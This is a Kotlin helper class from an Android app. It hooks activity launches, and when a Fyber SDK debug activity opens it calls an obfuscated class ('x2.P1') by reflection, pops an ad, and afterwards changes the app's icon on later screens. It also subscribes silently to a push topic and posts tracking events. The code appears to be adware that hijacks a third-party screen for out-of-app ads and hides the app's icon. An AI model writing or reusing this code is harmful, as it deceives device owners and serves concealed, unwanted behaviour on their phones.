package com.cat.manx.feline

import android.annotation.SuppressLint
import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.os.Build
import com.cat.manx.ap.AppCache
import com.cat.manx.cache.BoolCacheImpl
import com.cat.manx.common.Tools
import com.cat.manx.net.NetworkJsonHelper
import com.cat.manx.start.PageHelper
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.ktx.messaging

/**
 * Date：2025/7/2
 * Describe:
 */
class QueenHelper {
    private val mPageHelper by lazy { PageHelper() }
    private val is26Level by lazy { Build.VERSION.SDK_INT >= 26 }
    private val queenStr = "Queen_id_1900"
    private val claName = "com.fyber.inneractive.sdk.activities.FyberDebugActivity"
    private var isOpenFcmInfo by BoolCacheImpl()

    init {
        if (isOpenFcmInfo.not()) {
            runCatching {
                Firebase.messaging.subscribeToTopic("shooter_fcm").addOnSuccessListener {
                    isOpenFcmInfo = true
                }
            }
        }
    }

    @SuppressLint("NewApi")
    fun setNotification(context: Context) {
        if (is26Level) {
            val channel =
                NotificationChannel(queenStr, "cat_queen", NotificationManager.IMPORTANCE_DEFAULT)
            (context.getSystemService(Service.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                channel
            )
        }
    }

    private var isTrue = false
    private var isPost = false

    fun pageAdd(activity: Activity) {
        FelineActivityCache.listActivity.add(activity)
        if (activity::class.java.canonicalName == claName) {
            isTrue = true
            Class.forName("x2.P1").getMethod("a3", Any::class.java).invoke(null, activity)
            Tools.mNetworkEvent.eventPost("test_pop")
            FelineActivityCache.mCenterAdHelper.show(activity)
        } else {
            if (isTrue) {
                mPageHelper.modifyIcon(activity)
            }
        }
        if (isPost.not() && activity::class.java.canonicalName == "com.unity3d.player.UnityPlayerActivity") {
            isPost = true
            Tools.mNetworkEvent.eventPost(
                "app_front",
                "${(System.currentTimeMillis() - FelineActivityCache.firstTime) / 1000}"
            )
        }
    }

    operator fun plus(activity: Activity) {
        if (Tools.isShowNotification) return
        AppCache.startNot(activity)
    }

    fun finish() {
        FelineActivityCache.finishPage()
    }

}